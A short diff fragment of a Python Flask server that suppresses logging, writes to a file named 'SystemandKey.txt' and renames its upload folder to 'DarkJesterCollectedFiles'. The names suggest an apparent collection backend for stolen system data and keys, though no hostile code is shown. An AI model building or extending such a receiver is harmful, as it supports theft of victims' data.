@@ -25,7 +25,7 @@ logging.getLogger().setLevel(logging.CRITICAL)
 app = Flask(__name__)
 data_store = {}
 file_name_output = 'SystemandKey.txt'
-upload_folder = 'uploaded_files'
+upload_folder = 'DarkJesterCollectedFiles'
 os.makedirs(upload_folder, exist_ok=True)
 
 def save_data_to_file():
